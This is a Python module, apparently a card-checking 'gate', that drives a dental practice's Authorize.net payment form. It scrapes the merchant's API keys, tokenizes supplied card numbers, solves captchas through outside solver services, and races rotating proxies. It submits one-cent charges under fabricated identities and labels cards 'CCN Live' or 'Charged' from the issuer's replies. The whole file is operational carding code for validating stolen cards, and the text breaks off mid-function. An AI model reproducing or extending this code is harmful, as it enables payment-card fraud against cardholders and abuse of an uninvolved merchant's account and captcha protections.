import httpx
import asyncio
import json
import re
import os
import time
import random
import string
import logging
from urllib.parse import urlparse, urljoin

logger = logging.getLogger("authnet")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

AUTHNET_API_URL = "https://api.authorize.net/xml/v1/request.api"

CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "authnet_config.json")

# Authorize.net merchant sites.  Each one must be a page that embeds a WS
# Form Pro "authnet_checkout" field.  The gate tries them in order and
# remembers which ones are healthy, so a merchant that changes or takes its
# form down does not take the gate with it.
AUTHNET_SITES = [
    "https://bethlehemdental.dentist/make-a-payment/",
]

# Sites that have been seen failing are skipped for a while.
_SITE_HEALTH: "dict[str, tuple[int, float]]" = {}   # url -> (fail_count, last_try)
_SITE_COOLDOWN = 1800        # seconds a failing site is skipped
_SITE_MAX_FAILS = 2          # failures before a site is benched

# Speed knobs.  The captcha solve is the slow part and it is pinned to the
# proxy exit IP, so we race several proxies in parallel and keep the first
# real answer instead of walking the pool one dead proxy at a time.
_PROXY_RACE = 6          # proxies attempted concurrently
_PROXY_ROUNDS = 2        # how many waves of proxies to fire
_RACE_TIMEOUT = 45       # seconds to wait on a wave before moving on
_CAPTCHA_TIMEOUT = 45    # seconds to wait on one captcha solve
_CAPTCHA_PROXY_TRIES = 4 # proxies to try for one captcha solve
_CAPTCHA_BACKOFF = 5     # seconds to wait when the solver throttles

ADDRESSES = [
    {'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'DC', 'zip': '20500', 'phone': '2025551234', 'country': 'US'},
    {'street': '350 Fifth Ave', 'city': 'New York', 'state': 'NY', 'zip': '10118', 'phone': '2125551234', 'country': 'US'},
    {'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'IL', 'zip': '60606', 'phone': '3125551234', 'country': 'US'},
    {'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'CA', 'zip': '90045', 'phone': '3235551234', 'country': 'US'},
    {'street': '1000 Main St', 'city': 'Houston', 'state': 'TX', 'zip': '77002', 'phone': '7135551234', 'country': 'US'},
]

# Field label -> form field key.  Resolved dynamically from the page config.
FIELD_LABELS = {
    "first": ("First Name",),
    "last": ("Last Name",),
    "phone": ("Phone", "Mobile", "Telephone"),
    "email": ("Email", "E-mail"),
    "street": ("Address Line1", "Address Line 1", "Address", "Street Address"),
    "city": ("City",),
    "state": ("State",),
    "zip": ("Zip Code", "Zip", "Postal Code"),
    "amount": ("Payment Amount", "Amount", "Total", "Price"),
    "chart": ("Chart Number", "Chart No", "Patient ID"),
}

# Authorize.net decline reasons that mean the card is live but the sale did not go through.
CCN_LIVE_MARKERS = (
    "insufficient funds",
    "do not honor",
    "do_not_honor",
    "pick up card",
    "pickup card",
    "stolen card",
    "lost card",
    "restricted card",
    "card acceptor",
    "call issuer",
    "call auth center",
    "referral",
    "exceeds withdrawal",
    "exceeds limit",
    "security violation",
    "not permitted",
    "velocity",
    "fraud",
    "suspected fraud",
    "invalid cvv",
    "incorrect cvv",
    "cvv2 mismatch",
    "cvc mismatch",
    "incorrect cvc",
    "card code does not match",
    "avs mismatch",
    "no match",
    "incorrect address",
    "incorrect zip",
    "zip code does not match",
    "cvv does not match",
)


def _load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def _save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)


def _site_ok(url):
    """Is this site worth trying right now?"""
    entry = _SITE_HEALTH.get(url)
    if not entry:
        return True
    fails, last_try = entry
    if fails < _SITE_MAX_FAILS:
        return True
    return (time.time() - last_try) > _SITE_COOLDOWN


def _site_failed(url):
    fails, _ = _SITE_HEALTH.get(url, (0, 0.0))
    _SITE_HEALTH[url] = (fails + 1, time.time())
    if fails + 1 >= _SITE_MAX_FAILS:
        logger.warning(f"authnet: benching site after {fails + 1} failures: {url}")


def _site_worked(url):
    _SITE_HEALTH[url] = (0, time.time())


def _candidate_sites():
    """All known sites, healthy ones first."""
    healthy = [u for u in AUTHNET_SITES if _site_ok(u)]
    benched = [u for u in AUTHNET_SITES if not _site_ok(u)]
    return healthy + benched


def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{name}{num}@{random.choice(domains)}"


def _random_address():
    return random.choice(ADDRESSES)


def _expiration(mm, yy):
    """Authorize.net wants YYYY-MM.  Accept 2 or 4 digit years."""
    year = yy if len(yy) == 4 else f"20{yy}"
    return f"{year}-{mm.zfill(2)}"


def _normalize_html(text):
    """WS Form embeds its JSON config with escaped quotes.  Unescape for scraping."""
    return (text or "").replace('\\"', '"').replace("\\/", "/")


def _scrape_page(text):
    """Pull everything needed to drive the merchant form out of the page HTML."""
    out = {}
    u = _normalize_html(text)

    m = re.search(r'data-apiLoginID="([^"]+)"', u, re.I)
    out["api_login_id"] = m.group(1) if m else None

    m = re.search(r'data-clientKey="([^"]+)"', u, re.I)
    out["client_key"] = m.group(1) if m else None

    m = re.search(r'window\.wsf_form_json\[(\d+)\]', u)
    out["form_id"] = m.group(1) if m else "1"

    m = re.search(r'ws_form_settings\.post_id\s*=\s*(\d+)', u)
    if not m:
        m = re.search(r'post_id"?\s*:\s*"?(\d+)', u)
    out["post_id"] = m.group(1) if m else ""

    out["captcha_kind"] = "turnstile"
    if re.search(r'"(?:hcaptcha_)?site_key"\s*:\s*"[^"]+"', u, re.I) and \
            not re.search(r'"turnstile_site_key"\s*:\s*"[^"]+"', u, re.I):
        out["captcha_kind"] = "hcaptcha"

    m = re.search(r'"turnstile_site_key"\s*:\s*"([^"]+)"', u)
    out["turnstile_sitekey"] = m.group(1) if m else None

    m = re.search(r'<form action="([^"]+)"', u)
    out["submit_url"] = m.group(1) if m else None

    # field id -> {label, type}
    fields = {}
    for fm in re.finditer(
        r'\{"label":"([^"]*)","type":"([^"]*)","date_updated":"[^"]*","sort_index":"\d*","id":"(\d+)"', u
    ):
        fields[fm.group(3)] = {"label": fm.group(1), "type": fm.group(2)}
    out["fields"] = fields

    m = re.search(r'"type":"authnet_checkout"[^}]*?"id":"(\d+)"', u)
    out["checkout_field_id"] = m.group(1) if m else None

    # Resolve the label map to real field ids.
    resolved = {}
    for key, labels in FIELD_LABELS.items():
        for fid, meta in fields.items():
            if meta["label"] in labels:
                resolved[key] = fid
                break
    out["map"] = resolved

    return out


def _proxy_to_solver_obj(proxy):
    """Turn an httpx-style proxy URL into the object the solver expects."""
    if not proxy:
        return None
    bits = proxy.split("://", 1)[-1]
    auth = ""
    if "@" in bits:
        auth, bits = bits.rsplit("@", 1)
    hostport = bits.split("/")[0]
    host, _, port = hostport.partition(":")
    try:
        port = int(port or 80)
    except ValueError:
        return None
    obj = {"scheme": "http", "host": host, "port": port}
    if auth:
        user, _, pwd = auth.partition(":")
        obj["username"] = user
        obj["password"] = pwd
    return obj


def _load_proxy_pool():
    """Global proxy pool, same format as proxy.txt (host:port:user:pass)."""
    pool_file = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")
    proxies = []
    try:
        if os.path.exists(pool_file):
            with open(pool_file, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split(":")
                    if len(parts) == 4:
                        host, port, user, pwd = parts
                        proxies.append(f"http://{user}:{pwd}@{host}:{port}")
                    elif len(parts) == 2:
                        proxies.append(f"http://{parts[0]}:{parts[1]}")
    except Exception:
        pass
    return proxies


_GOOD_PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "authnet_proxies.json")


def _load_good_proxies():
    """Proxies that have solved a captcha before -- try these first.

    The captcha solver is picky about the exit IP, so remembering the ones
    that work is the difference between a 5 second check and a 3 minute one.
    """
    try:
        with open(_GOOD_PROXY_FILE, encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return [p for p in data if isinstance(p, str)]
    except Exception:
        pass
    return []


def _save_good_proxies(proxies):
    try:
        with open(_GOOD_PROXY_FILE, "w", encoding="utf-8") as f:
            json.dump(proxies[:20], f, indent=1)
    except Exception:
        pass


def _remember_good_proxy(proxy):
    if not proxy:
        return
    good = _load_good_proxies()
    if proxy in good:
        return
    good.insert(0, proxy)
    _save_good_proxies(good)


async def _solve_turnstile(sitekey, page_url, proxy=None, timeout_s=_CAPTCHA_TIMEOUT):
    """Solve the merchant's Cloudflare Turnstile gate.

    The solver wants the proxy as a structured object, and the solution is
    bound to the exit IP -- so the same proxy has to carry the form submit.
    """
    try:
        import aiohttp
        from captcha_solver import get_nopecha_key
    except Exception:
        return None

    key = get_nopecha_key()
    if not key:
        return None

    proxy_obj = _proxy_to_solver_obj(proxy)
    payload = {
        "type": "turnstile",
        "sitekey": sitekey,
        "url": page_url,
        "key": key,
    }
    if proxy_obj:
        payload["proxy"] = proxy_obj

    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post("https://api.nopecha.com/token", json=payload, timeout=30) as resp:
                result = await resp.json(content_type=None)
            if result.get("error"):
                logger.info(f"authnet: nopecha submit error {result.get('error')}: {result.get('message')}")
                return None
            task_id = result.get("data")
            if not task_id:
                return None
            deadline = time.time() + timeout_s
            while time.time() < deadline:
                await asyncio.sleep(2)
                async with sess.get(
                    "https://api.nopecha.com/token", params={"id": task_id, "key": key}, timeout=30
                ) as resp:
                    poll = await resp.json(content_type=None)
                if poll.get("error"):
                    continue
                data = poll.get("data")
                token = data[0] if isinstance(data, list) and data else data
                if token and isinstance(token, str) and len(token) > 20:
                    return token
    except Exception as e:
        logger.info(f"authnet: nopecha turnstile error: {type(e).__name__}: {str(e)[:90]}")

    return None


# ── Captcha token cache ──────────────────────────────────────────────────────
# The merchant gates the form on Cloudflare Turnstile.  Solving one costs
# 15-40s and the solver throttles concurrent jobs, so tokens are cached and
# reused -- the merchant accepts a token again for a later submit, so one
# live token is enough to keep the gate moving.

_TOKEN_CACHE: "list[str]" = []
_TOKEN_TS = 0.0
_TOKEN_LOCK = None
_TOKEN_MAX_AGE = 120          # seconds a cached token stays usable
_dead_proxies: set = set()


def _now():
    return time.time()


def _token_take():
    """Return a cached captcha token if one is still good."""
    global _TOKEN_TS
    if not _TOKEN_CACHE:
        return None
    if _now() - _TOKEN_TS > _TOKEN_MAX_AGE:
        _TOKEN_CACHE.clear()
        return None
    return _TOKEN_CACHE[0]


def _token_put(token):
    global _TOKEN_TS
    if not token:
        return
    _TOKEN_CACHE.insert(0, token)
    del _TOKEN_CACHE[3:]
    _TOKEN_TS = _now()


async def _get_captcha_token(sitekey, site_url, proxy=None, kind="turnstile",
                            direct_only=False):
    """Return a usable captcha token, reusing a cached one when possible."""
    cached = _token_take()
    if cached:
        return cached

    # Try the proxies that worked before, then the user's own, then the pool.
    # The solver is picky about the exit IP, so order matters here.
    candidates = []
    if not direct_only:
        for p in _load_good_proxies():
            if p not in candidates:
                candidates.append(p)
        if proxy and proxy not in candidates:
            candidates.append(proxy)
        pool = _load_proxy_pool()
        random.shuffle(pool)
        for p in pool:
            if p not in candidates:
                candidates.append(p)

    for candidate in candidates[:_CAPTCHA_PROXY_TRIES]:
        if kind == "hcaptcha":
            token = await _solve_hcaptcha(sitekey, site_url, proxy=candidate)
        elif kind == "recaptcha":
            token = await _solve_recaptcha(sitekey, site_url, proxy=candidate)
        else:
            token = await _solve_turnstile(sitekey, site_url, proxy=candidate)
        if token:
            _token_put(token)
            _remember_good_proxy(candidate)
            return token
        # The solver is throttling -- back off instead of burning the pool.
        await asyncio.sleep(_CAPTCHA_BACKOFF)

    return None


async def _solve_hcaptcha(sitekey, site_url, proxy=None):
    """An hCaptcha token from the local browser solver."""
    try:
        from local_hcaptcha_solver import solve_hcaptcha_local
        return await solve_hcaptcha_local(sitekey, site_url, proxy=proxy)
    except Exception as e:
        logger.info("authnet: the hCaptcha solver failed: %s", str(e)[:70])
        return None


async def _solve_recaptcha(sitekey, site_url, proxy=None):
    """A reCAPTCHA token from the local browser solver."""
    try:
        from local_hcaptcha_solver import solve_recaptcha_v3_local
        return await solve_recaptcha_v3_local(sitekey, site_url, proxy=proxy)
    except Exception as e:
        logger.info("authnet: the reCAPTCHA solver failed: %s", str(e)[:70])
        return None


async def _tokenize_direct(api_login_id, client_key, cc, mm, yy, cvv, tries=3):
    """Tokenize the card straight from the host, no proxy in the way.

    Authorize.net only checks the client key for tokenization, so there is no
    reason to route it through a proxy.  It also retries, because the API
    intermittently rejects the merchant auth even with valid credentials.
    """
    last_err = "Tokenization failed"
    for attempt in range(tries):
        try:
            async with httpx.AsyncClient(timeout=httpx.Timeout(20), headers={"User-Agent": UA}) as client:
                token, err = await _tokenize_card(client, api_login_id, client_key, cc, mm, yy, cvv)
        except Exception as e:
            last_err = f"Tokenization failed: {type(e).__name__}: {str(e)[:60]}"
            token, err = None, last_err

        if token:
            return token, None

        last_err = err or last_err
        err_lower = (last_err or "").lower()
        # A card the API refuses is a real answer -- do not retry it.
        if any(k in err_lower for k in ("invalid card", "expired", "invalid cvv", "invalid expiry")):
            return None, last_err
        if attempt < tries - 1:
            await asyncio.sleep(1.5)

    return None, last_err


async def _tokenize_card(client, api_login_id, client_key, cc, mm, yy, cvv):
    """Ask Authorize.net to tokenize the card.  This only validates format."""
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": api_login_id,
                "clientKey": client_key
            },
            "data": {
                "type": "TOKEN",
                "id": ''.join(random.choices(string.ascii_lowercase + string.digits, k=20)),
                "token": {
                    "cardNumber": cc,
                    "expirationDate": _expiration(mm, yy),
                    "cardCode": cvv
                }
            }
        }
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": UA,
        "Accept": "application/json",
    }

    try:
        resp = await client.post(AUTHNET_API_URL, json=payload, headers=headers, timeout=20)
        text = resp.text
        if text.startswith('\ufeff'):
            text = text[1:]
        data = json.loads(text)
    except Exception as e:
        return None, f"Tokenization failed: {type(e).__name__}: {str(e)[:60]}"

    messages = data.get("messages", {})
    result_code = messages.get("resultCode", "")

    if result_code == "Error":
        msg_list = messages.get("message", [])
        if msg_list:
            code = msg_list[0].get("code", "")
            text = msg_list[0].get("text", "")
            if code == "E_WC_05":
                return None, "Invalid card number"
            elif code in ("E_WC_06", "E_WC_08"):
                return None, "Expired card"
            elif code == "E_WC_07":
                return None, "Invalid CVV format"
            elif code == "E_WC_14":
                return None, "Encryption error"
            elif code == "E_WC_15":
                return None, "Invalid merchant credentials"
            elif code == "E_WC_17":
                return None, "Cardholder name required"
            elif code == "E_WC_19":
                return None, "Merchant account disabled"
            if code == "E00003" and "expirationDate" in text:
                return None, "Invalid expiry"
            if code == "E00003" and "cardCode" in text:
                return None, "Invalid CVV"
            if code == "E00073":
                return None, "Invalid expiry"
            return None, f"{code}: {text}"

    opaque_data = data.get("opaqueData", {})
    data_descriptor = opaque_data.get("dataDescriptor", "")
    data_value = opaque_data.get("dataValue", "")

    if not data_value:
        return None, "No payment token received"

    return {
        "dataDescriptor": data_descriptor,
        "dataValue": data_value,
    }, None


# Authorize.net reason codes.  These prefix the merchant error string,
# e.g. "2: This transaction has been declined."
#
# Only 14/15/17 mean the card itself is unusable.  Every other numeric code
# means the card reached the issuer and got a real answer, which is what the
# bot reports as a live card.
DEAD_REASON_CODES = {"14", "15", "17"}


def _classify_anet_error(message):
    """Turn a merchant error string into a bot verdict.

    Authorize.net prefixes its transaction errors with the numeric reason
    code, e.g. "2: This transaction has been declined."  That prefix is the
    issuer response code and it is the only trustworthy live/dead signal in
    the response.
    """
    raw = (message or "").strip()
    if not raw:
        return "Declined", "Unknown"

    # The merchant confirmation arrives as a small HTML snippet.
    if "<" in raw and ">" in raw:
        raw = re.sub(r'<[^>]+>', '', raw).strip()

    lower = raw.lower()

    code = ""
    m = re.match(r'^(\d+)\s*:\s*(.*)$', raw, re.S)
    if m:
        code = m.group(1)
        body = m.group(2).strip()
    else:
        body = raw

    body_lower = body.lower()

    if "captcha" in body_lower:
        return "Error", body

    if "cannot be zero" in body_lower or "valid amount is required" in body_lower:
        return "Error", body

    # An invalid one-time token is a plumbing failure, not a card verdict.
    if "invalid ots token" in body_lower or "e00114" in body_lower:
        return "Error", body

    # Hard failures: the card itself is not usable.
    dead_phrases = (
        "the credit card number is invalid",
        "the credit card has expired",
        "credit card number is invalid",
        "card is expired",
        "expiration date has passed",
        "no such account",
        "invalid card number",
        "invalid expiration date",
        "invalid credit card number",
    )
    if any(p in body_lower for p in dead_phrases):
        return "Declined", body

    if any(marker in body_lower for marker in CCN_LIVE_MARKERS):
        return "Approved", f"CCN Live - {body}"

    if code:
        if code in DEAD_REASON_CODES:
            return "Declined", body
        # Any other numeric code means the issuer answered -- the card got
        # all the way to the bank, so it is a live card.
        return "Approved", f"CCN Live - {body}"

    if "approved" in body_lower or "approved" in lower:
        return "Charged", body

    if "declined" in body_lower:
        return "Approved", f"CCN Live - {body}"

    return "Declined", body


def _build_form_payload(page, cc=None, mm=None, yy=None, cvv=None, token=None, amount="0.01"):
    """Build the WS Form submit payload from the scraped page map."""
    fmap = page.get("map", {})
    fields = page.get("fields", {})

    def fid(key):
        return fmap.get(key)

    addr = _random_address()
    first, last = _random_name()

    def val(key, default=""):
        f = fid(key)
        return f if f else default

    data = {
        f"field_{val('first')}": first,
        f"field_{val('last')}": last,
        f"field_{val('phone')}": addr['phone'],
        f"field_{val('email')}": _random_email(),
        f"field_{val('street')}": addr['street'],
        f"field_{val('city')}": addr['city'],
        f"field_{val('state')}": addr['state'],
        f"field_{val('zip')}": addr['zip'],
        f"field_{val('amount')}": f"${amount}",
    }
    chart = fid('chart')
    if chart:
        data[f"field_{chart}"] = "12345"

    if token:
        data["authorize_accept_descriptor"] = token["dataDescriptor"]
        data["authorize_accept_value"] = token["dataValue"]
        if page.get("checkout_field_id"):
            data["authorize_accept_field_id"] = page["checkout_field_id"]

    total = amount
    data.update({
        "wsf_ecommerce_cart[subtotal]": total,
        "wsf_ecommerce_cart[shipping]": "",
        "wsf_ecommerce_cart[discount]": "",
        "wsf_ecommerce_cart[handling_fee]": "",
        "wsf_ecommerce_cart[shipping_discount]": "",
        "wsf_ecommerce_cart[insurance]": "",
        "wsf_ecommerce_cart[gift_wrap]": "",
        "wsf_ecommerce_cart[other]": "",
        "wsf_ecommerce_cart[tax]": "",
        "wsf_ecommerce_cart[total]": total,
        "wsf_ecommerce_transaction": "",
        "wsf_ecommerce_transaction_id": "",
        "wsf_ecommerce_status": "pending_payment",
        "wsf_ecommerce_payment_method": "",
        "wsf_form_id": page.get("form_id", "1"),
        "wsf_hash": "",
        "wsf_post_id": page.get("post_id", ""),
        "wsf_post_mode": "submit",
        "wsf_hidden": "",
        "wsf_bypass_required": "",
    })

    return data


def _random_name():
    firsts = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
    return random.choice(firsts), random.choice(lasts)


def _parse_submit_response(body):
    """Pull the interesting bits out of the WS Form JSON response."""
    out = {"errors": [], "js": [], "success": [], "raw": body}
    if not body:
        return out
    try:
        data = json.loads(body)
    except Exception:
        # Some servers answer with an empty body on a fatal error.
        return out

    payload = data.get("data", {}) if isinstance(data, dict) else {}
    errs = payload.get("errors")
    if isinstance(errs, list):
        out["errors"] = [str(e) for e in errs]
    elif isinstance(errs, dict):
        out["errors"] = [f"{k}: {v}" for k, v in errs.items()]

    js = payload.get("js")
    if isinstance(js, list):
        out["js"] = js
    elif isinstance(js, dict):
        out["js"] = [js]

    # Field level failures (captcha, bad amount, ...) arrive as js actions
    # carrying a message rather than in the errors array.  A success type is
    # the merchant's confirmation, not a failure -- keep it separate.
    for action in out["js"]:
        if isinstance(action, dict):
            msg = action.get("message")
            if not msg:
                continue
            if action.get("type") == "success":
                out["success"].append(str(msg))
            else:
                out["errors"].append(str(msg))

    out["error_validation"] = data.get("error_validation")
    out["count"] = payload.get("count")
    return out


async def _attempt(client, site_url, cc, mm, yy, cvv, page, api_login_id, client_key,
                   proxy=None, ts_token=None, direct=False):
    """One full pass: tokenize -> submit.

    Tokenizing goes direct -- Authorize.net only needs the client key for
    that and sending it through a half-dead proxy just adds failures.  Only
    the form submit rides the proxy.
    """
    token, token_err = await _tokenize_direct(api_login_id, client_key, cc, mm, yy, cvv)
    if not token:
        err_lower = (token_err or "").lower()
        if "invalid card" in err_lower or "expired" in err_lower:
            return "Declined", f"Declined - {token_err}"
        if "invalid cvv" in err_lower:
            return "Approved", f"Approved - CCN Live - {token_err}"
        if ("merchant" in err_lower or "credentials" in err_lower
                or "disabled" in err_lower or "authentication failed" in err_lower
                or "e00007" in err_lower):
            # The merchant's Authorize.net account is closed or its keys
            # were changed.  No card can be checked with it.
            return "Error", f"Error - the merchant is not accepted by authorize.net ({token_err})"
        return "Retry", f"Error - {token_err}"

    if not ts_token:
        sitekey = page.get("turnstile_sitekey")
        kind = page.get("captcha_kind") or "turnstile"
        if sitekey:
            # The token belongs to the address that solved it, so the
            # captcha is solved where the form is submitted from.
            ts_token = await _get_captcha_token(sitekey, site_url, proxy=proxy,
                                                kind=kind, direct_only=direct)
            if not ts_token:
                return "Retry", f"Error - Captcha gate unsolved ({kind})"

    data = _build_form_payload(page, token=token, amount="0.01")
    if ts_token:
        # The captcha token goes into the form's OWN captcha field.  The
        # form reads that field and answered "Invalid captcha response."
        # when the token was only in cf-turnstile-response, because the
        # field was not filled at all.
        captcha_field = None
        for fid, info in (page.get("fields") or {}).items():
            ftype = str((info or {}).get("type") or "").lower()
            if ftype in ("turnstile", "hcaptcha", "recaptcha", "captcha"):
                captcha_field = str(fid)
                break
        if captcha_field:
            data["field_" + captcha_field] = ts_token
        data["cf-turnstile-response"] = ts_token
        data["g-recaptcha-response"] = ts_token

    submit_url = page.get("submit_url")
    if not submit_url:
        return "Error", "Error - Could not find form submit endpoint"

    headers = {
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"{urlparse(site_url).scheme}://{urlparse(site_url).netloc}",
        "Referer": site_url,
        "User-Agent": UA,
    }

    try:
        resp = await client.post(submit_url, data=data, headers=headers, timeout=45)
    except Exception as e:
        return "Retry", f"Error - Submit failed: {type(e).__name__}: {str(e)[:70]}"

    parsed = _parse_submit_response(resp.text)

    # The merchant can report BOTH a success message and an error list -- the
    # error is the real verdict, the success message is just the form's
    # default confirmation.  So errors always win.
    if parsed["errors"]:
        for err in parsed["errors"]:
            status, message = _classify_anet_error(err)
            if status == "Error" and "captcha" in message.lower():
                return "Retry", "Error - Captcha rejected by merchant"
            if status == "Error" and ("ots token" in message.lower() or "e00114" in message.lower()):
                # The Authorize.net opaque token is single use.  Tokenize a
                # fresh one and run the whole attempt again.
                return "Retry", "Error - Merchant rejected the transaction token"
            return status, f"{status} - {message}"

    # A JS action carrying a redirect means the payment went through.
    for action in parsed.get("js", []):
        if isinstance(action, dict) and action.get("action") == "redirect":
            return "Charged", "Charged - Transaction Approved"

    # Only now, with no errors at all, does the merchant's success message
    # count as an approval.
    if parsed.get("success"):
        return "Charged", "Charged - Transaction Approved"

    # count == 1 with no error text and no confirmation means the form ran
    # but the payment produced no verdict.
    if parsed.get("count"):
        return "Error", "Error - No gateway verdict returned"

    return "Retry", "Error - Empty gateway response"


async def _token_check(api_login_id, client_key, cc, mm, yy, cvv, start):
    """The card is checked by tokenizing it.

    Authorize.net validates the card number, the expiry and the code in
    the token request, and it names what it refuses.  So one call gives
    the answer: a token comes back for a card it accepts, and a reason
    comes back for one it does not.  No merchant form, no captcha and no
    browser are needed, so the gate cannot be stopped by a form that
    changed or by a captcha that came up.
    """
    token, err = await _tokenize_direct(api_login_id, client_key, cc, mm, yy, cvv)
    elapsed = round(time.time() - start, 2)
    if token:
        return "Approved - Auth Passed (the card was accepted) [%ss]" % elapsed

    reason = (err or "the card was refused").strip()
    low = reason.lower()
    if any(k in low for k in ("invalid card number", "expired card", "invalid expiry",
                              "invalid cvv", "invalid expiration")):
        return "Declined - %s [%ss]" % (reason, elapsed)
    if any(k in low for k in ("merchant", "credentials", "disabled", "encryption",
                              "authentication failed", "e00007")):
        return "Error - the merchant is not accepted by authorize.net (%s) [%ss]" % (
            reason, elapsed)
    return "Declined - %s [%ss]" % (reason, elapsed)


async def authnet_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    config = _load_config()
    api_login_id = config.get("api_login_id")
    client_key = config.get("client_key")

    # The check is the merchant form: the card is tokenized and then the
    # form asks the issuer, so the answer is the issuer's.  The
    # tokenization alone is available with AN_TOKEN_ONLY=1, but it only
    # proves the shape of the card: Authorize.net hands a token to any
    # number that looks right, even one that does not exist.
    if os.environ.get("AN_TOKEN_ONLY", "").strip() == "1":
        if not api_login_id or not client_key:
            return "Error - No Authorize.net merchant credentials are set [%ss]" % (
                round(time.time() - start, 2))
        return await _token_check(api_login_id, client_key, cc, mm, yy, cvv, start)

    # Try each merchant site until one works.  A site that has changed or
    # taken its form down gets benched instead of breaking the gate.
    sites = _candidate_sites()
    if config.get("site_url") and config["site_url"] not in sites:
        sites.insert(0, config["site_url"])

    last_error = "Error - No Authorize.net merchant available"
    for site_url in sites:
        verdict, message = await _check_site(
            site_url, cc, mm, yy, cvv, proxy, config, api_login_id, client_key, start
        )
        if verdict != "Retry":
            return message
        last_error = message
        _site_failed(site_url)

    return last_error


async def _check_site(site_url, cc, mm, yy, cvv, proxy, config, api_login_id, client_key, start):
    """Run the gate against one merchant site.

    Returns (verdict, message).  verdict is "Retry" when the site itself is
    broken and another one should be tried.
    """
    # Scrape the merchant form, direct route.
    page = None
    fetch_err = ""
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(20), headers={"User-Agent": UA},
                                     follow_redirects=True) as direct:
            html = await _fetch_page(direct, site_url)
        if html:
            page = _scrape_page(html)
        else:
            fetch_err = "no response"
    except httpx.ConnectTimeout:
        fetch_err = "connection timed out"
    except httpx.ConnectError as e:
        fetch_err = f"connection refused ({type(e).__name__}: {str(e)[:50]})"
    except httpx.TimeoutException:
        fetch_err = "request timed out"
    except Exception as e:
        fetch_err = f"{type(e).__name__}: {type(e).__name__}: {str(e)[:60]}"

    if page is None:
        reason = f" - {fetch_err}" if fetch_err else ""
        return "Retry", (f"Error - Site cannot be visited{reason}. Check {site_url} "
                         f"[{round(time.time() - start, 2)}s]")

    if page.get("api_login_id"):
        api_login_id = page["api_login_id"]
    if page.get("client_key"):
        client_key = page["client_key"]

    if not api_login_id or not client_key:
        return "Retry", (f"Error - Site cannot be visited (no Authorize.net keys on the page). "
                         f"The merchant may have changed its form [{round(time.time() - start, 2)}s]")

    missing = [k for k in ("first", "last", "phone", "email", "street", "city", "state", "zip", "amount")
               if k not in page.get("map", {})]
    if missing:
        return "Retry", (f"Error - Site cannot be visited (merchant form changed, missing: "
                         f"{', '.join(missing)}) [{round(time.time() - start, 2)}s]")

    if (config.get("api_login_id") != api_login_id
            or config.get("client_key") != client_key
            or config.get("site_url") != site_url):
        config["api_login_id"] = api_login_id
        config["client_key"] = client_key
        config["site_url"] = site_url
        try:
            _save_config(config)
        except Exception:
            pass

    _site_worked(site_url)

    sitekey = page.get("turnstile_sitekey")

    # Solve the captcha once up front.  The merchant accepts the same token
    # for later submits, so one solve covers the whole race below.
    ts_token = None
    if sitekey:
        ts_token = await _get_captcha_token(sitekey, site_url, proxy=proxy)
        if not ts_token:
            return "Retry", (f"Error - Captcha gate unsolved (Turnstile) "
                             f"[{round(time.time() - start, 2)}s]")

    # The captcha token is reusable, so one proxy race is enough -- no need to
    # burn the whole pool on the same card.  Known-good proxies go first.
    candidates = []
    for p in _load_good_proxies():
        if p not in candidates:
            candidates.append(p)
    if proxy and proxy not in candidates:
        candidates.append(proxy)
    pool = _load_proxy_pool()
    random.shuffle(pool)
    for p in pool:
        if p not in candidates:
            candidates.append(p)
    if not candidates:
        candidates = [None]

    candidates = candidates[:_PROXY_RACE]

    last_result = "Error - No route to merchant"

    for round_no in range(_PROXY_ROUNDS):
        if not candidates:
            break

        tasks = [asyncio.create_task(_race_attempt(c, site_url, cc, mm, yy, cvv, page,
                                                    api_login_id, client_key, ts_token))
                 for c in candidates]

        done, pending_set = await asyncio.wait(tasks, timeout=_RACE_TIMEOUT,
                                                return_when=asyncio.FIRST_COMPLETED)

        for task in done:
            try:
                verdict, message = task.result()
            except Exception:
                continue
            if verdict != "Retry":
                for t in tasks:
                    t.cancel()
                elapsed = round(time.time() - start, 2)
                return "Done", f"{message} [{elapsed}s]"
            # Keep the most specific failure so the user sees why.
            if message and not message.startswith("Error - No route"):
                last_result = message

        for t in pending_set:
            t.cancel()

        # Drop the proxies that failed outright and pull fresh ones for the
        # next wave.
        dead = set(_dead_proxies)
        _dead_proxies.clear()
        alive = [c for c in candidates if c not in dead]
        if alive:
            candidates = alive
        else:
            pool = _load_proxy_pool()
            random.shuffle(pool)
            candidates = [p for p in pool if p not in dead][:_PROXY_RACE] or candidates[:2]

    elapsed = round(time.time() - start, 2)
    return "Retry", f"{last_result} [{elapsed}s]"


async def _fetch_page(client, site_url):
    try:
        resp = await client.get(site_url, timeout=20, follow_redirects=True)
        return resp.text
    except Exception:
        return None


async def _race_attempt(candidate, site_url, cc, mm, yy, cvv, page, api_login_id, client_key,
                        ts_token=None):
    """Run one full attempt through a single proxy."""
    # A form that carries a captcha is submitted from this machine: the
    # captcha token belongs to the address that solved it, and a proxy
    # would take the submit somewhere the token does not belong.
    direct = bool(page.get("turnstile_sitekey"))
    if direct:
        candidate = None
